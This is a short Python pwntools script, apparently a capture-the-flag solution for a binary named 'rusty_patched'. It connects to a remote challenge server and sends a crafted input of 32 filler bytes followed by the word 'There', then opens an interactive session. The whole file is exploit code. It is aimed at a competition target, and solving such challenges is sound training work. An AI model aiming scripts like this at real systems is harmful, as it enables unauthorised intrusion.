#!/usr/bin/env python3

from pwn import *

exe = ELF("./rusty_patched")

context.binary = exe


def conn():
    r = process([exe.path])
    return r


def main():
    #r = conn()
    r = remote("challs.tfcctf.com", 30323)
    r.sendline(b"M"*0x20 + b"There")

    r.interactive()


if __name__ == "__main__":
    main()
